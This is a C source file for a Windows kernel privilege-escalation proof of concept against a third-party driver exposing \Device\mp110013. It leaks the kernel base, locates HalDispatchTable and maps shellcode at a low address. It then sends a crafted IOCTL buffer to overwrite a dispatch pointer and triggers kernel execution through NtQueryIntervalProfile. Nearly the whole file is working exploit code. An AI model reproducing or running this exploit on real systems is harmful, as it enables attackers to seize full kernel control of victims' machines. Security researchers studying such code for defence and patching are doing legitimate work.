#include "poc.h"
#include "InvbShellCode.h"

#define BUFFER_LENGTH 128
#define IOCTL_MICROPOINT 0x8000012C

PVOID RtlAllocateMemory(
						IN ULONG Length)
{
    NTSTATUS NtStatus;
	
    PVOID BaseAddress = NULL;
	
	
    NtStatus = NtAllocateVirtualMemory(
		NtCurrentProcess(),
		&BaseAddress,
		0,
		&Length,
		MEM_RESERVE |
		MEM_COMMIT,
		PAGE_READWRITE);
	
    if(NtStatus == STATUS_SUCCESS)
    {
        RtlZeroMemory(BaseAddress, Length);
		
        return BaseAddress;
    }
	
    return NULL;
}

VOID RtlFreeMemory(
				   IN PVOID BaseAddress)
{
    NTSTATUS NtStatus;
	
    ULONG FreeSize = 0;
	
	
    NtStatus = NtFreeVirtualMemory(
		NtCurrentProcess(),
		&BaseAddress,
		&FreeSize,
		MEM_RELEASE);
}

int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
	
	ULONG i;
    HANDLE DeviceHandle;
    ULONG ReturnLength = 0;
    
    ULONG ImageBase;
    PVOID MappedBase;
    UCHAR ImageName[KERNEL_NAME_LENGTH];
    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
    PVOID HalDispatchTable;
    PVOID xHalQuerySystemInformation;
    PVOID MmUserProbeAddress;
	
    ULONG ShellCodeSize = PAGE_SIZE;
    PVOID ShellCodeAddress;
    PVOID BaseAddress = NULL;
	
    UNICODE_STRING DeviceName;
    UNICODE_STRING DllName;
    ANSI_STRING ProcedureName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    SYSTEM_MODULE_INFORMATION_EX *ModuleInformation = NULL;
    LARGE_INTEGER Interval; 

	char buffer1[1024]={0};
	char buffer2[1024]={0};
	
	ULONG InternalBuffer = 0;
    char SystemBuffer[BUFFER_LENGTH]= 
	/* 
	77 00 04 00    03 00 00 00    20 C5 88 03     3F 00 0F 00 
	C8 FA 88 03 00 00 00 00 00 00 00 00 00 00 00 00 
	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
	*/
	{
		//						A46
		0x7B,0x67,0xB4,0x33,  0x00,0x0A,0x00,0x00,   0x8B,0x68,0xDD,0x6F,0x01,0x52,0x5A,0xB5,
			0x28,0x14,0x44,0x89,0x78,0x32,0xEA,0x5F,0x8E,0x75,0x6B,0x22,0x38,0xB1,0xFD,0x46,
			0x23,0xDB,0xAC,0xFB,0x1D,0x45,0x8F,0x04,0x73,0xD9,0x24,0x1F,0x8A,0x70,0xA6,0xD7,
			0x62,0x7B,0xC2,0x36,0xE7,0xBB,0x3A,0x9D,0x11,0xA8,0xF5,0x84,0x8C,0xCA,0xE3,0xFE,
			0x49,0x79,0x26,0x0D,0x61,0x9A,0x8D,0x17,0xBE,0x6E,0x61,0x57,0x78,0x9C,0xA4,0xC2,
			0x36,0x22,0x8C,0x56,0x39,0xB8,0x26,0x54,0xF1,0xA0,0x1E,0x78,0x5F,0xD3,0xDF,0x98,
			0x35,0x66,0x83,0x55,0xDE,0x14,0x59,0xE2,0x94,0xC4,0xDE,0x31,0xFC,0xF8,0x2F,0x2C,
			0x12,0x04,0xD4,0x0A,0xEE,0x0F,0x95,0xE2,0xDC,0xA1,0x3F,0xB8,0x13,0x55,0x83,0xD3
	};
//Õý³£ÊäÈë
// 	{
// 		0x77, 0x00 , 0x04 , 0x00 ,     0x03 , 0x00 , 0x00 , 0x00 ,    0x20 , 0xC5 , 0x88 , 0x03 ,   0x3F , 0x00 , 0x0F , 0x00, 
// 		0xC8, 0xFA , 0x88 , 0x03
// 	};

	//*(ULONG *)((ULONG)SystemBuffer+8)=(ULONG)buffer1;
	//*(ULONG *)((ULONG)SystemBuffer+16)=(ULONG)buffer2;
    
    ///////////////////////////////////////////////////////////////////////////////////////////////
	
    system("cls");
	
    NtStatus = NtQuerySystemInformation(
		SystemModuleInformation,
		ModuleInformation,
		ReturnLength,
		&ReturnLength);
	
    if(NtStatus == STATUS_INFO_LENGTH_MISMATCH)
    {
        ReturnLength = (ReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
        
        ModuleInformation = RtlAllocateMemory(ReturnLength);
		
        if(ModuleInformation)
        {
            NtStatus = NtQuerySystemInformation(
				SystemModuleInformation,
				ModuleInformation,
				ReturnLength,
				NULL);
			
            if(NtStatus == STATUS_SUCCESS)
            {
                ImageBase = (ULONG)(ModuleInformation->Modules[0].Base);
				
                RtlMoveMemory(
					ImageName,
					(PVOID)(ModuleInformation->Modules[0].ImageName +
					ModuleInformation->Modules[0].ModuleNameOffset),
					KERNEL_NAME_LENGTH);
				
                printf(" +----------------------------------------------------------------------------+\n"
					" | ImageBase - 0x%.8X                                                     |\n"
					" | ImageName - %s                                                   |\n",
					ImageBase,
					ImageName);
				
				
                RtlFreeMemory(ModuleInformation);
				
				
                RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);
				
				
                NtStatus = LdrLoadDll(
					NULL,                // DllPath
					&DllCharacteristics, // DllCharacteristics
					&DllName,            // DllName
					&MappedBase);        // DllHandle
				
                if(NtStatus)
                {
                    printf(" [*] NtStatus of LdrLoadDll - %.8X\n", NtStatus);    
                    return NtStatus;
                }
				
				
                RtlInitAnsiString(&ProcedureName, "HalDispatchTable");
				
				
                NtStatus = LdrGetProcedureAddress(
					(PVOID)MappedBase,          // DllHandle
					&ProcedureName,             // ProcedureName
					0,                          // ProcedureNumber OPTIONAL
					(PVOID*)&HalDispatchTable); // ProcedureAddress
				
                if(NtStatus)
                {
                    printf(" [*] NtStatus of LdrGetProcedureAddress - %.8X\n", NtStatus);    
                    return NtStatus;
                }
				
                (ULONG)HalDispatchTable -= (ULONG)MappedBase;
                (ULONG)HalDispatchTable += ImageBase;
				
                (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + sizeof(ULONG);
				
                printf(" |                                                                            |\n"
					" | HalDispatchTable - 0x%.8X                                              |\n"
					" | xHalQuerySystemInformation - 0x%.8X                                    |\n"
					" +----------------------------------------------------------------------------+\n",
					HalDispatchTable,
					xHalQuerySystemInformation);
				
				
                NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);
				
                if(NtStatus)
                {
                    printf(" [*] NtStatus of XxInitInbv - %.8X\n", NtStatus);	
                    return NtStatus;
                }
				
                LdrUnloadDll((PVOID)MappedBase);
				
				
                RtlInitUnicodeString(&DeviceName, L"\\Device\\mp110013");
				
                ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
                ObjectAttributes.RootDirectory = 0;
                ObjectAttributes.ObjectName = &DeviceName;
                ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
                ObjectAttributes.SecurityDescriptor = NULL;
                ObjectAttributes.SecurityQualityOfService = NULL;
				
                NtStatus = NtCreateFile(
					&DeviceHandle,     // FileHandle
					FILE_READ_DATA |
					FILE_WRITE_DATA,   // DesiredAccess
					&ObjectAttributes, // ObjectAttributes
					&IoStatusBlock,    // IoStatusBlock
					NULL,              // AllocationSize OPTIONAL
					0,                 // FileAttributes
					FILE_SHARE_READ |
					FILE_SHARE_WRITE, // ShareAccess
					FILE_OPEN_IF,     // CreateDisposition
					0,                // CreateOptions
					NULL,             // EaBuffer OPTIONAL
					0);               // EaLength
				
                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtCreateFile - %.8X\n", NtStatus);    
                    return NtStatus;
                }

				printf(" [*] NtCreateFile - DeviceHandle = %.8X\n", DeviceHandle); 
				
				///////////////////////////////////////////////////////////////////////////////////////////////
				
				///////////////////////////////////////////////////////////////////////////////////////////////
				
                ShellCodeAddress = (PVOID)sizeof(ULONG);
				
                NtStatus = NtAllocateVirtualMemory(
					NtCurrentProcess(),      // ProcessHandle
					&ShellCodeAddress,       // BaseAddress
					0,                       // ZeroBits
					&ShellCodeSize,          // AllocationSize
					MEM_RESERVE | 
					MEM_COMMIT |
					MEM_TOP_DOWN,            // AllocationType
					PAGE_EXECUTE_READWRITE); // Protect
				
                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtAllocateVirtualMemory - %.8X\n", NtStatus);    
                    return NtStatus;
                }
				
				printf("NtAllocateVirtualMemory ShellCodeAddress = %08X ShellCodeSize=%08X\n", ShellCodeAddress,ShellCodeSize); 
				
                RtlMoveMemory(
					ShellCodeAddress,
					(PVOID)InbvShellCode,
                    ShellCodeSize);
				///////////////////////////////////////////////////////////////////////////////////////////////
							
				
				NtStatus = NtDeviceIoControlFile(
					DeviceHandle,
					NULL,
					NULL,
					NULL,
					&IoStatusBlock,
					IOCTL_MICROPOINT,
					SystemBuffer,
					BUFFER_LENGTH,
					NULL,
					0);
 
				
				if(NtStatus)
				{
					printf(" [*] NtStatus of NtDeviceIoControlFile [3] - 0x%.8X\n", NtStatus);
					return NtStatus;
				}
				


                Interval.LowPart = 0xFF676980;
                Interval.HighPart = 0xFFFFFFFF;

                printf("\n 3");
                NtDelayExecution(FALSE, &Interval);

                printf(" 2");
                NtDelayExecution(FALSE, &Interval);

                printf(" 1");
                NtDelayExecution(FALSE, &Interval);

                printf(" Hoop\n\n");
                NtDelayExecution(FALSE, &Interval);


                NtStatus = NtQueryIntervalProfile(
                                                  ProfileTotalIssues, // Source
                                                  NULL);              // Interval

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtQueryIntervalProfile - %.8X\n", NtStatus);
                    return NtStatus;
                }

				printf("NtQueryIntervalProfile ok!\n");
                

                NtStatus = NtClose(DeviceHandle);

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtClose - %.8X\n", NtStatus);    
                    return NtStatus;
                }

				printf("NtClose ok!\n");
            }
        }
    }
    
    return FALSE;
}